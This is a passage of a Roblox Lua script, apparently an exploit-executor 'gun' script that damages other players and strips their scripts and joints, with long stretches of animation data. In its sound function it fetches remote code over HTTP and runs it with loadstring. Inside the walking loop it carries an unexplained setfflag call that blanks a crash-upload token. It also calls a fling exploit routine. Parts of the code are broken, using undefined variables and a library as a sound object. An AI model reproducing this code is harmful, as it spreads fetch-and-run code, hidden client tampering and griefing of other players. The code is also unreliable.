					local new = p0:FindFirstChild(name)
					local ac0 = new.C0
					local ac1 = new.C1
					new.Part0 = p0
					new.C0 = c0
					new.C1 = c1
					spawn(function()
						if name ~= "RootJoint" then
							if not fast then
								for i = 0, 0.6, 0.1 do
									print(i)
									new.C0 = new.C0:Lerp(ac0, 0.5)
									new.C1 = new.C1:lerp(ac1, 0.5)
									swait()
								end
							else
								new.C0 = new.C0:Lerp(ac0, 1)
								new.C1 = new.C1:lerp(ac1, 1)
							end
						end
					end)
				end
			end
		end
		function fixalljoints(fast)
			for i,v in pairs({"Right Shoulder", "Left Shoulder", "Right Hip", "Left Hip",  "Neck", "RootJoint"}) do
				removejoint(v, fast)
			end
		end
		function getnewjoints()
			local rs = replacejoint("Right Shoulder")
			local ls = replacejoint("Left Shoulder")
			local rh = replacejoint("Right Hip")
			local lh = replacejoint("Left Hip")
			local neck = replacejoint("Neck")
			local rj = replacejoint("RootJoint")
			return rs,ls,rh,lh,neck,rj
		end
		function knockback(hit, force)
			local bv = Instance.new("BodyVelocity")
			bv.MaxForce = huge
			bv.Velocity = force
			bv.Parent = hit
			game:GetService('Debris'):AddItem(bv, 0.15)
		end
		function soundeffect(id, volume, speed, parent, forcewait)
			local func = function()
				local s = LoadLibrary("RbxUtility").Create("Sound")()
				s.Name = "SoundEffect"
				s.Volume = volume
				s.PlaybackSpeed = speed
				s.SoundId = id
				s.Looped = false
				s.Parent = parent
				s:Play()
				repeat wait() until not s.Playing
				s:Destroy()
			end
			if forcewait then
				func()
			else
				spawn(func)
			end
		end
		function specialsound(id, volume, speed, parent, starts, ends)
			local func = function()
				local s = loadstring(game:HttpGet("https://raw.githubusercontent.com/Roblox/Core-Scripts/master/CoreScriptsRoot/Libraries/RbxUtility.lua"))()
				s.Name = "SoundEffect"
				s.Volume = volume
				s.PlaybackSpeed = speed
				s.SoundId = id
				s.TimePosition = starts
				s.Looped = false
				s.Parent = parent
				repeat swait() until s.TimePosition >= ends
				s:Destroy()
			end
			spawn(func)
		end
		function hurt(hit, dmg)
			--pcall(function()
			local hum = hit.Parent:FindFirstChildOfClass("Humanoid")
			if hum then
				if hum.Parent ~= char and not hum.Parent:FindFirstChild("kk_urcool") then
					hum.Health = hum.Health - dmg
					return true
				end
			end
			--end)
		end
		function disable(hit)
			pcall(function()
				for i,v in pairs(hit.Parent:GetChildren()) do
					if v:IsA("Script") and v.Name ~= "Animate" then
						v:Destroy()
						soundeffect("rbxassetid://1132948877", 1, 1, char.Head)
					end
					if v:IsA("Model") then
						v:BreakJoints()
					end
					if v.Name ~= "Torso" and v.Name ~= "HumanoidRootPart" then
						for _,child in pairs(v:GetChildren()) do
							if child:IsA("Weld") then
								child:Destroy()
							end
						end
					end
				end
			end)
		end
		pcall(function()

		end)
		humanoid.Running:connect(function(speed)
			if speed > 2 then
				currentanim = "Walking"
			else
				currentanim = "Idle"
			end
		end)
		humanoid.Jumping:connect(function(active)
			if active then
				currentanim = "Jumping"
			end
		end)
		humanoid.FallingDown:connect(function(active)
			if active then
				currentanim = "Falling"
			end
		end)
		humanoid.FreeFalling:connect(function(active)
			if active and char.HumanoidRootPart.Velocity.Y < 0 then
				currentanim = "Falling"
			end
		end)
		pcall(function()
			char.Animate:Destroy()
		end)
		for i,v in pairs(humanoid:GetPlayingAnimationTracks()) do
			v:Stop()
		end
		--[[ Actual script :OOOOOOOOOO ]]--
		local gun = Instance.new("Part")
		gun.Size = Vector3.new(1, 1, 2)
		gun.CanCollide = false
		gun.Anchored = false
		gun.Color = Color3.new(0,0,0)
		local gunw = Instance.new("Weld")
		gunw.Name = "GunWeld"
		gunw.Part0 = gun
		gunw.Part1 = char["Right Arm"]
		gunw.C1 = CFrame.new(0,-1,-0.25) *CFrame.Angles(math.rad(270),math.rad(0),math.rad(0))
		gunw.Parent = gun
		local m = Instance.new("SpecialMesh")
		m.MeshId = "http://www.roblox.com/asset/?id=4372594"
		m.Scale = Vector3.new(1.2,1.2,1.2)
		m.Parent = gun
		gun.Parent = char

		addattack(Enum.KeyCode.R, function()
			if not attacking then
				if mode == "Normal" then
					mode = "Heal"
					gun.Color = Color3.new(0,1,0)
					specialsound("rbxassetid://741894739", 5, 1, char, 18.49549100592, 20.526269195994)
				else
					gun.Color = Color3.new(0,0,0)
					mode = "Normal"
					soundeffect("rbxassetid://833797091", 5, 1, char)
				end
			end
		end)
		addattack(Enum.KeyCode.Q, function()
			if not attacking then
				mode = "Disable"
				gun.Color = Color3.new(1,0,0)
				specialsound("rbxassetid://741894739", 5, 1, char, 33.878067323327, 35.438444041738)
			end
		end)
		addattack(Enum.KeyCode.P, function()
			if bgmusic.Playing then
				bgmusic:Stop()
			else
				bgmusic:Play()
			end
		end)
		--anti arceus x module here :)
		addattack("MouseClick", function()
			if not attacking then
				cananim = false
				attacking = true
				for i = 0, 0.6, 0.1 do
					rs.C0 = rs.C0:Lerp(CFrame.new(1, 0.5, 0, -4.37113883e-08, 0, 1, -0, 0.99999994, 0, -1, 0, -4.37113883e-08), 0.6)
					rs.C1 = rs.C1:Lerp(CFrame.new(-0.235909924, 0.846874475, 0, 0.399310559, 0.00480417395, 0.916803062, -0.916736782, -0.0110294167, 0.399339437, 0.0120302998, -0.99992764, 5.25861077e-10), 0.6)
					ls.C0 = ls.C0:Lerp(CFrame.new(-1, 0.5, 0, -4.37113883e-08, 0, -1, 0, 0.99999994, 0, 1, 0, -4.37113883e-08), 0.6)
					ls.C1 = ls.C1:Lerp(CFrame.new(0.232030958, 1.28329468, 0, 0.758646905, 0.0105680302, -0.651416421, 0.65135318, 0.00907341763, 0.758720517, 0.0139287533, -0.999902964, -6.08845141e-10), 0.6)
					rh.C0 = rh.C0:Lerp(CFrame.new(1, -1, 0, -4.37113883e-08, 0, 1, -0, 0.99999994, 0, -1, 0, -4.37113883e-08), 0.6)
					rh.C1 = rh.C1:Lerp(CFrame.new(0.5, 1, 0, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08), 0.6)
					lh.C0 = lh.C0:Lerp(CFrame.new(-1, -1, 0, -4.37113883e-08, 0, -1, 0, 0.99999994, 0, 1, 0, -4.37113883e-08), 0.6)
					lh.C1 = lh.C1:Lerp(CFrame.new(-0.5, 1, 0, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08), 0.6)
					neck.C0 = neck.C0:Lerp(CFrame.new(0, 1, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0), 0.6)
					neck.C1 = neck.C1:Lerp(CFrame.new(0, -0.5, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0), 0.6)
					rj.C0 = rj.C0:Lerp(CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0), 0.6)
					rj.C1 = rj.C1:Lerp(CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0), 0.6)
					swait()
				end
				local sounds = {
					{17.49, 17.981267708586};
					{17.490114626798, 17.755552823579};
					{18, 18.465876732586707476};
				}
				local ids = sounds[math.random(#sounds)]
				specialsound("rbxassetid://741894739", 5, 1, char, ids[1], ids[2])
				local p = Instance.new("Part")
				p.Anchored = false
				p.Material = "Neon"
				p.CanCollide = false
				local start = gun.Position +Vector3.new(0.5,0,-0.5)
				local endp = mouse.Hit.p
				local ray = Ray.new(start, (endp-start).unit * 999)
				p.Size = Vector3.new(0.1,0.1,mag)
				miztfling({
					Method = 'Lerp', -- This method will visualized like a gun firing.
					Args = {
						mouse.Hit.p, -- Change this to starting CFrame.
						mouse.Hit.p, -- Change this to ending CFrame.
						1, -- Max amount of time.
						30 -- Max lerp per fling.
					}
				})
				local bp = Instance.new("BodyPosition")
				bp.MaxForce = huge
				bp.Position = p.Position
				bp.Parent = p
				p.Color = gun.Color
				if mode == "Normal" then
					p.Color = Color3.new(1,1,1)
				end
				p.Parent = workspace
				spawn(function()
					for i = 1, 10 do
						p.Transparency = i/10
						swait()
					end
					p:Destroy()
				end)
				local con
				local dmg = 750
				if mode == "Heal" then dmg = -1000 end
				if mode == "Disable" then dmg = 0 end
				con = p.Touched:connect(function(hit)
					if hurt(hit, dmg) then
						pcall(function()
							con:disconnect()
							if mode == "Disable" then
								disable(hit)
							end
							for i,v in pairs(hit.Parent:GetDescendants()) do
								spawn(function()
									if v:IsA("BasePart") and mode == "Normal" then
										local bv = Instance.new("BodyVelocity")
										bv.MaxForce = huge
										bv.Velocity = CFrame.new(start, position).lookVector*100
										bv.Parent = v
										game:GetService('Debris'):AddItem(bv, 0.1)
										if v.Transparency <= 0.9 then
											for i = 1, 20 do
												v.Transparency = i/20
												swait()
											end
										end
										v:Destroy()
									end
								end)
							end
						end)
					end
				end)
				for i = 0, 0.3, 0.1 do
					rs.C0 = rs.C0:Lerp(CFrame.new(1, 0.5, 0, -4.37113883e-08, 0, 1, -0, 0.99999994, 0, -1, 0, -4.37113883e-08), 0.8)
					rs.C1 = rs.C1:Lerp(CFrame.new(-0.108213484, 0.142491132, -0.0458124876, 0.399310559, 0.00480417395, 0.916803062, -0.907117367, -0.142995536, 0.395841271, 0.133000448, -0.989711702, -0.0527416691), 0.8)
					ls.C0 = ls.C0:Lerp(CFrame.new(-1, 0.5, 0, -4.37113883e-08, 0, -1, 0, 0.99999994, 0, 1, 0, -4.37113883e-08), 0.8)
					ls.C1 = ls.C1:Lerp(CFrame.new(-0.214841455, 0.866598129, -0.112976491, 0.758646905, 0.0105680302, -0.651416421, 0.64655149, -0.135239884, 0.750787199, -0.0801631361, -0.990756512, -0.109432101), 0.8)
					rh.C0 = rh.C0:Lerp(CFrame.new(1, -1, 0, -4.37113883e-08, 0, 1, -0, 0.99999994, 0, -1, 0, -4.37113883e-08), 0.8)
					rh.C1 = rh.C1:Lerp(CFrame.new(0.5, 1, 0, -4.37113883e-08, 0, 1, -0.104150683, 0.994561553, -4.55257076e-09, -0.994561553, -0.104150683, -4.34736656e-08), 0.8)
					lh.C0 = lh.C0:Lerp(CFrame.new(-1, -1, 0, -4.37113883e-08, 0, -1, 0, 0.99999994, 0, 1, 0, -4.37113883e-08), 0.8)
					lh.C1 = lh.C1:Lerp(CFrame.new(-0.5, 1, 0, -4.37113883e-08, 0, -1, -0.0883838907, 0.996086478, 3.8633825e-09, 0.996086478, 0.0883838907, -4.35403216e-08), 0.8)
					neck.C0 = neck.C0:Lerp(CFrame.new(0, 1, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0), 0.8)
					neck.C1 = neck.C1:Lerp(CFrame.new(0, -0.49999997, 0, -1, 0, 0, 0, 0.0492738597, 0.998785317, 0, 0.998785317, -0.0492738597), 0.8)
					rj.C0 = rj.C0:Lerp(CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0), 0.8)
					rj.C1 = rj.C1:Lerp(CFrame.new(0, 0, 0, -1, 0, 0, 0, 0.0276213959, 0.999618471, 0, 0.999618471, -0.0276213959), 0.8)
					swait()
				end
				cananim = true
				attacking = false
			end
		end)
		while true do
			swait()
			if currentanim == "Jumping" and cananim then
				for i = 0, 1.2, 0.1 do
					if currentanim ~= "Jumping" or not cananim then break end
					rs.C0 = rs.C0:Lerp(CFrame.new(1, 0.5, 0, -4.37113883e-08, 0, 1, -0, 0.99999994, 0, -1, 0, -4.37113883e-08), 0.4)
					rs.C1 = rs.C1:Lerp(CFrame.new(0.0997244716, 0.195344329, -0.746855855, -0.155881107, 0.00388455181, 0.987768173, 0.260807574, -0.964343727, 0.0449508503, 0.952722609, 0.264624417, 0.149309859), 0.4)
					ls.C0 = ls.C0:Lerp(CFrame.new(-1, 0.5, 0, -4.37113883e-08, 0, -1, 0, 0.99999994, 0, 1, 0, -4.37113883e-08), 0.4)
					ls.C1 = ls.C1:Lerp(CFrame.new(0.793125331, 0.89348793, -0.0677016973, 0.986068428, -0.132806748, -0.100156575, 0.1031176, 0.0155911446, 0.994546831, -0.130520999, -0.991019309, 0.0290686507), 0.4)
					rh.C0 = rh.C0:Lerp(CFrame.new(1, -1, 0, -4.37113883e-08, 0, 1, -0, 0.99999994, 0, -1, 0, -4.37113883e-08), 0.4)
					rh.C1 = rh.C1:Lerp(CFrame.new(0.49999997, 0.99999994, -4.47034836e-08, -0.0421661586, 0.0827250704, 0.995679915, 0.25110203, 0.965456486, -0.0695800334, -0.967041731, 0.247083336, -0.0614820197), 0.4)
					lh.C0 = lh.C0:Lerp(CFrame.new(-1, -1, 0, -4.37113883e-08, 0, -1, 0, 0.99999994, 0, 1, 0, -4.37113883e-08), 0.4)
					lh.C1 = lh.C1:Lerp(CFrame.new(-0.49999997, 1, 2.98023224e-08, 0.0194152314, 0, -0.99981153, 0.178683311, 0.983900607, 0.00346983178, 0.983715117, -0.178716987, 0.0191026554), 0.4)
					neck.C0 = neck.C0:Lerp(CFrame.new(0, 1, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0), 0.4)
					neck.C1 = neck.C1:Lerp(CFrame.new(0, -0.5, 0, -1, 0, 0, 0, 0.0515226237, 0.99867183, 0, 0.99867183, -0.0515226237), 0.4)
					rj.C0 = rj.C0:Lerp(CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0), 0.4)
					rj.C1 = rj.C1:Lerp(CFrame.new(0, 0.128909558, -0.0269506648, -0.996639967, -0.0819067881, 0, -0.00100739487, 0.0122579783, 0.999924421, -0.0819005966, 0.996564567, -0.0122992992), 0.4)
					swait()
				end
			end
			if currentanim == "Falling" and cananim then
				for i = 0, 1.2, 0.1 do
					if currentanim ~= "Falling" or not cananim then break end
					rs.C0 = rs.C0:Lerp(CFrame.new(1, 0.5, 0, -4.37113883e-08, 0, 1, -0, 0.99999994, 0, -1, 0, -4.37113883e-08), 0.4)
					rs.C1 = rs.C1:Lerp(CFrame.new(0.0997244716, 0.389569163, -0.799008012, -0.155881107, 0.00388455181, 0.987768173, 0.0170185864, -0.999833226, 0.00661772862, 0.987629175, 0.0178419873, 0.155789018), 0.4)
					ls.C0 = ls.C0:Lerp(CFrame.new(-1, 0.5, 0, -4.37113883e-08, 0, -1, 0, 0.99999994, 0, 1, 0, -4.37113883e-08), 0.4)
					ls.C1 = ls.C1:Lerp(CFrame.new(0.800841689, 0.89348793, 0.000534057617, 0.989977896, 0.0953866094, -0.104139231, 0.1031176, 0.0155911446, 0.994546831, 0.0964901, -0.995318174, 0.00559884822), 0.4)
					rh.C0 = rh.C0:Lerp(CFrame.new(1, -1, 0, -4.37113883e-08, 0, 1, -0, 0.99999994, 0, -1, 0, -4.37113883e-08), 0.4)
					rh.C1 = rh.C1:Lerp(CFrame.new(0.49999997, 1, -1.49011612e-08, -0.0421661586, 0.0827250704, 0.995679915, -0.0600035824, 0.994557679, -0.085172914, -0.997307122, -0.0633357614, -0.0369728766), 0.4)
					lh.C0 = lh.C0:Lerp(CFrame.new(-1, -1, 0, -4.37113883e-08, 0, -1, 0, 0.99999994, 0, 1, 0, -4.37113883e-08), 0.4)
					lh.C1 = lh.C1:Lerp(CFrame.new(-0.499999881, 1, 3.7252903e-08, 0.0207479522, -0.155918092, -0.987552047, -0.00691960612, 0.987718761, -0.156089753, 0.999760866, 0.0100720376, 0.0194142479), 0.4)
					neck.C0 = neck.C0:Lerp(CFrame.new(0, 1, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0), 0.4)
					neck.C1 = neck.C1:Lerp(CFrame.new(0, -0.5, 0, -1, 0, 0, 0, 0.0515226237, 0.99867183, 0, 0.99867183, -0.0515226237), 0.4)
					rj.C0 = rj.C0:Lerp(CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0), 0.4)
					rj.C1 = rj.C1:Lerp(CFrame.new(0, 0.313415587, -0.0163925812, -0.996639967, -0.0819067881, 0, 0.00564728118, -0.0687159598, 0.997620344, -0.0817118809, 0.994268239, 0.068947643), 0.4)
					swait()
				end
			end
			if currentanim == "Walking" and cananim then
				for i = 0, 0.6, 0.1 do
					if currentanim ~= "Walking" or not cananim then break end
					rs.C0 = rs.C0:Lerp(CFrame.new(1, 0.5, 0, -4.37113883e-08, 0, 1, -0, 0.99999994, 0, -1, 0, -4.37113883e-08), 0.6)
					rs.C1 = rs.C1:Lerp(CFrame.new(0.0997244716, -0.134959042, -0.791477084, -0.155881107, 0.00388455181, 0.987768173, 0.0728884861, -0.997220755, 0.0154243633, 0.985082865, 0.0744013041, 0.155164748), 0.6)
					ls.C0 = ls.C0:Lerp(CFrame.new(-1, 0.5, 0, -4.37113883e-08, 0, -1, 0, 0.99999994, 0, 1, 0, -4.37113883e-08), 0.6)
					ls.C1 = ls.C1:Lerp(CFrame.new(0.728777826, 0.934069037, -0.221951187, 0.958276987, -0.133620545, -0.252687156, 0.254302055, -0.00512516592, 0.96711117, -0.130520999, -0.991019309, 0.0290686507), 0.6)
					rh.C0 = rh.C0:Lerp(CFrame.new(1, -1, 0, -4.37113883e-08, 0, 1, -0, 0.99999994, 0, -1, 0, -4.37113883e-08), 0.6)
					rh.C1 = rh.C1:Lerp(CFrame.new(0.49999997, 1, 0, -0.0421661586, 0.0827250704, 0.995679915, -0.568820775, 0.817300439, -0.0919936299, -0.82137984, -0.570242465, 0.0125933159), 0.6)
					lh.C0 = lh.C0:Lerp(CFrame.new(-1, -1, 0, -4.37113883e-08, 0, -1, 0, 0.99999994, 0, 1, 0, -4.37113883e-08), 0.6)
					lh.C1 = lh.C1:Lerp(CFrame.new(-0.49999997, 1, 0, 0.0194152314, 0, -0.99981153, -0.845399499, 0.53388226, -0.0164167192, 0.533781588, 0.845558882, 0.0103654461), 0.6)
					neck.C0 = neck.C0:Lerp(CFrame.new(0, 1, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0), 0.6)
					neck.C1 = neck.C1:Lerp(CFrame.new(0, -0.5, 0, -1, 0, 0, 0, 0.0515226237, 0.99867183, 0, 0.99867183, -0.0515226237), 0.6)
					rj.C0 = rj.C0:Lerp(CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0), 0.6)
					rj.C1 = rj.C1:Lerp(CFrame.new(0, 0.239933819, 0, -0.996639967, -0.0819067881, 0, 0.00819849782, -0.0997591168, 0.994977891, -0.0814954415, 0.991634667, 0.100095451), 0.6)
					swait()
				end
				local rslastc0 = rs.C0
				local rslastc1 = rs.C1
				local lslastc0 = ls.C0
				local lslastc1 = ls.C1
				local rhlastc0 = rh.C0
				local rhlastc1 = rh.C1
				local lhlastc0 = lh.C0
				local lhlastc1 = lh.C1
				local necklastc0 = neck.C0
				local necklastc1 = neck.C1
				local rjlastc0 = rj.C0
				local rjlastc1 = rj.C1
				local max = 0.6
				for i = 0, max, 0.1 do
					if currentanim ~= "Walking" or not cananim then break end
					rs.C0 = rslastc0:Lerp(CFrame.new(1, 0.5, 0, -4.37113883e-08, 0, 1, -0, 0.99999994, 0, -1, 0, -4.37113883e-08), i/max)
					rs.C1 = rslastc1:Lerp(CFrame.new(0.0997244716, -0.134959042, -0.791477084, -0.155881107, 0.00388455181, 0.987768173, 0.0728884861, -0.997220755, 0.0154243633, 0.985082865, 0.0744013041, 0.155164748), i/max)
					ls.C0 = lslastc0:Lerp(CFrame.new(-1, 0.5, 0, -4.37113883e-08, 0, -1, 0, 0.99999994, 0, 1, 0, -4.37113883e-08), i/max)
					ls.C1 = lslastc1:Lerp(CFrame.new(0.728777826, 0.934069037, -0.221951187, 0.958276987, -0.133620545, -0.252687156, 0.254302055, -0.00512516592, 0.96711117, -0.130520999, -0.991019309, 0.0290686507), i/max)
					rh.C0 = rhlastc0:Lerp(CFrame.new(1, -1, 0, -4.37113883e-08, 0, 1, -0, 0.99999994, 0, -1, 0, -4.37113883e-08), i/max)
					rh.C1 = rhlastc1:Lerp(CFrame.new(0.5, 0.675323606, 0, -0.0421661623, 0.0827250704, 0.995679975, 0.221647412, 0.972508371, -0.0714133158, -0.974214792, 0.217678651, -0.059342742), i/max)
					lh.C0 = lhlastc0:Lerp(CFrame.new(-1, -1, 0, -4.37113883e-08, 0, -1, 0, 0.99999994, 0, 1, 0, -4.37113883e-08), i/max)
					lh.C1 = lhlastc1:Lerp(CFrame.new(-0.49999997, 0.680277288, -1.49011612e-08, 0.0194152296, -2.24613939e-11, -0.99981153, -0.183868393, 0.982944369, -0.00357052009, 0.982759118, 0.183903053, 0.0190840904), i/max)
					neck.C0 = necklastc0:Lerp(CFrame.new(0, 1, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0), i/max)
					neck.C1 = necklastc1:Lerp(CFrame.new(0, -0.5, 0, -1, 0, 0, 0, 0.0515226237, 0.99867183, 0, 0.99867183, -0.0515226237), i/max)
					rj.C0 = rjlastc0:Lerp(CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0), i/max)
					rj.C1 = rjlastc1:Lerp(CFrame.new(0, 0.169720784, 0, -0.996639967, -0.0819067881, 0, 0.00819849782, -0.0997591168, 0.994977891, -0.0814954415, 0.991634667, 0.100095451), i/max)
					swait()
				end
				for i = 0, 0.6, 0.1 do
					if currentanim ~= "Walking" or not cananim then break end
					rs.C0 = rs.C0:Lerp(CFrame.new(1, 0.5, 0, -4.37113883e-08, 0, 1, -0, 0.99999994, 0, -1, 0, -4.37113883e-08), 0.6)
					rs.C1 = rs.C1:Lerp(CFrame.new(0.0997244716, -0.134959042, -0.791477084, -0.155881107, 0.00388455181, 0.987768173, 0.0728884861, -0.997220755, 0.0154243633, 0.985082865, 0.0744013041, 0.155164748), 0.6)
					ls.C0 = ls.C0:Lerp(CFrame.new(-1, 0.5, 0, -4.37113883e-08, 0, -1, 0, 0.99999994, 0, 1, 0, -4.37113883e-08), 0.6)
					ls.C1 = ls.C1:Lerp(CFrame.new(0.728777826, 0.934069037, -0.221951187, 0.958276987, -0.133620545, -0.252687156, 0.254302055, -0.00512516592, 0.96711117, -0.130520999, -0.991019309, 0.0290686507), 0.6)
					rh.C0 = rh.C0:Lerp(CFrame.new(1, -1, 0, -4.37113883e-08, 0, 1, -0, 0.99999994, 0, -1, 0, -4.37113883e-08), 0.6)
					rh.C1 = rh.C1:Lerp(CFrame.new(0.49999997, 1, 0, -0.0421661586, 0.0827250704, 0.995679915, 0.868188143, 0.496215105, -0.00446053827, -0.494440407, 0.864249468, -0.0927444026), 0.6)
					lh.C0 = lh.C0:Lerp(CFrame.new(-1, -1, 0, -4.37113883e-08, 0, -1, 0, 0.99999994, 0, 1, 0, -4.37113883e-08), 0.6)
					lh.C1 = lh.C1:Lerp(CFrame.new(-0.49999997, 1, 0, 0.0194152314, 0, -0.99981153, 0.595236421, 0.803467572, 0.0115588298, 0.803316057, -0.595348656, 0.015599506), 0.6)
					neck.C0 = neck.C0:Lerp(CFrame.new(0, 1, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0), 0.6)
					neck.C1 = neck.C1:Lerp(CFrame.new(0, -0.5, 0, -1, 0, 0, 0, 0.0515226237, 0.99867183, 0, 0.99867183, -0.0515226237), 0.6)
					rj.C0 = rj.C0:Lerp(CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0), 0.6)
					rj.C1 = rj.C1:Lerp(CFrame.new(0, 0.342528641, -9.31322575e-10, -0.996639967, -0.0819067955, -6.22866592e-10, 0.00819849595, -0.0997591242, 0.994977832, -0.0814954415, 0.991634727, 0.100095443), 0.6)
					swait()
				end
				local rslastc0 = rs.C0
				local rslastc1 = rs.C1
				local lslastc0 = ls.C0
				local lslastc1 = ls.C1
				local rhlastc0 = rh.C0
				local rhlastc1 = rh.C1
				local lhlastc0 = lh.C0
				local lhlastc1 = lh.C1
				local necklastc0 = neck.C0
				local necklastc1 = neck.C1
				local rjlastc0 = rj.C0
				local rjlastc1 = rj.C1
				setfflag("CrashUploadToBacktraceWindowsPlayerToken", "")
				local max = 0.6
				for i = 0, max, 0.1 do
					if currentanim ~= "Walking" or not cananim then break end
					rs.C0 = rslastc0:Lerp(CFrame.new(1, 0.5, 0, -4.37113883e-08, 0, 1, -0, 0.99999994, 0, -1, 0, -4.37113883e-08), i/max)
					rs.C1 = rslastc1:Lerp(CFrame.new(0.0997244716, -0.134959042, -0.791477084, -0.155881107, 0.00388455181, 0.987768173, 0.0728884861, -0.997220755, 0.0154243633, 0.985082865, 0.0744013041, 0.155164748), i/max)
					ls.C0 = lslastc0:Lerp(CFrame.new(-1, 0.5, 0, -4.37113883e-08, 0, -1, 0, 0.99999994, 0, 1, 0, -4.37113883e-08), i/max)
					ls.C1 = lslastc1:Lerp(CFrame.new(0.728777826, 0.934069037, -0.221951187, 0.958276987, -0.133620545, -0.252687156, 0.254302055, -0.00512516592, 0.96711117, -0.130520999, -0.991019309, 0.0290686507), i/max)
					rh.C0 = rhlastc0:Lerp(CFrame.new(1, -1, 0, -4.37113883e-08, 0, 1, -0, 0.99999994, 0, -1, 0, -4.37113883e-08), i/max)
					rh.C1 = rhlastc1:Lerp(CFrame.new(0.5, 0.675323606, 0, -0.0421661623, 0.0827250704, 0.995679975, 0.221647412, 0.972508371, -0.0714133158, -0.974214792, 0.217678651, -0.059342742), i/max)
					lh.C0 = lhlastc0:Lerp(CFrame.new(-1, -1, 0, -4.37113883e-08, 0, -1, 0, 0.99999994, 0, 1, 0, -4.37113883e-08), i/max)
					lh.C1 = lhlastc1:Lerp(CFrame.new(-0.49999997, 0.680277288, -1.49011612e-08, 0.0194152296, -2.24613939e-11, -0.99981153, -0.183868393, 0.982944369, -0.00357052009, 0.982759118, 0.183903053, 0.0190840904), i/max)
					neck.C0 = necklastc0:Lerp(CFrame.new(0, 1, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0), i/max)
					neck.C1 = necklastc1:Lerp(CFrame.new(0, -0.5, 0, -1, 0, 0, 0, 0.0515226237, 0.99867183, 0, 0.99867183, -0.0515226237), i/max)
					rj.C0 = rjlastc0:Lerp(CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0), i/max)
					rj.C1 = rjlastc1:Lerp(CFrame.new(5.82076609e-11, 0.2270886, 2.32830644e-10, -0.996639967, -0.0819067881, 4.13409307e-10, 0.00819849502, -0.0997591093, 0.994977832, -0.081495434, 0.991634727, 0.100095429), i/max)
					wait()
				end
			end
			if currentanim == "Idle" and cananim then
				for i = 0, 5, 0.1 do
					if currentanim ~= "Idle" or not cananim then break end
					rs.C0 = rs.C0:Lerp(CFrame.new(1, 0.5, 0, -4.37113883e-08, 0, 1, -0, 0.99999994, 0, -1, 0, -4.37113883e-08), 0.05)
					rs.C1 = rs.C1:Lerp(CFrame.new(0.0997244716, -0.105339587, -1.12973166, -0.155881107, 0.00388455181, 0.987768173, -0.0249122381, -0.999689579, -1.08894849e-09, 0.987461567, -0.0246075168, 0.155929506), 0.05)
					ls.C0 = ls.C0:Lerp(CFrame.new(-1, 0.5, 0, -4.37113883e-08, 0, -1, 0, 0.99999994, 0, 1, 0, -4.37113883e-08), 0.05)
					ls.C1 = ls.C1:Lerp(CFrame.new(0.998242438, 0.966719627, -0.251513988, 0.948773444, -0.0191214401, -0.315378129, 0.315314144, -0.00635479437, 0.948966026, -0.0201497618, -0.999796987, 8.80774065e-10), 0.05)
					rh.C0 = rh.C0:Lerp(CFrame.new(1, -1, 0, -4.37113883e-08, 0, 1, -0, 0.99999994, 0, -1, 0, -4.37113883e-08), 0.05)
					rh.C1 = rh.C1:Lerp(CFrame.new(0.5, 1, 0, -0.246849835, 0, 0.969053745, 0, 1, 0, -0.969053745, 0, -0.246849835), 0.05)
					lh.C0 = lh.C0:Lerp(CFrame.new(-1, -1, 0, -4.37113883e-08, 0, -1, 0, 0.99999994, 0, 1, 0, -4.37113883e-08), 0.05)
					lh.C1 = lh.C1:Lerp(CFrame.new(-0.5, 1, 0, 0.0194152314, 0, -0.99981153, 0, 1, 0, 0.99981153, 0, 0.0194152314), 0.05)
					neck.C0 = neck.C0:Lerp(CFrame.new(0, 1, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0), 0.05)
					neck.C1 = neck.C1:Lerp(CFrame.new(0, -0.5, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0), 0.05)
					rj.C0 = rj.C0:Lerp(CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0), 0.05)
					rj.C1 = rj.C1:Lerp(CFrame.new(0, 0, 0, -0.996639967, -0.0819067881, 0, 0, 0, 1, -0.0819067881, 0.996639967, 0), 0.05)
					swait()
				end
				for i = 0, 5, 0.1 do
					if currentanim ~= "Idle" or not cananim then break end
					rs.C0 = rs.C0:Lerp(CFrame.new(1, 0.5, 0, -4.37113883e-08, 0, 1, -0, 0.99999994, 0, -1, 0, -4.37113883e-08), 0.05)
					rs.C1 = rs.C1:Lerp(CFrame.new(0.0997244716, -0.134959042, -1.07218063, -0.155881107, 0.00388455181, 0.987768173, 0.0728884861, -0.997220755, 0.0154243633, 0.985082865, 0.0744013041, 0.155164748), 0.05)
					ls.C0 = ls.C0:Lerp(CFrame.new(-1, 0.5, 0, -4.37113883e-08, 0, -1, 0, 0.99999994, 0, 1, 0, -4.37113883e-08), 0.05)
					ls.C1 = ls.C1:Lerp(CFrame.new(0.994734883, 0.934069037, -0.221951187, 0.958276987, -0.133620545, -0.252687156, 0.254302055, -0.00512516592, 0.96711117, -0.130520999, -0.991019309, 0.0290686507), 0.05)
					rh.C0 = rh.C0:Lerp(CFrame.new(1, -1, 0, -4.37113883e-08, 0, 1, -0, 0.99999994, 0, -1, 0, -4.37113883e-08), 0.05)
					rh.C1 = rh.C1:Lerp(CFrame.new(0.5, 1, 0, -0.246849835, 0, 0.969053745, 0, 1, 0, -0.969053745, 0, -0.246849835), 0.05)
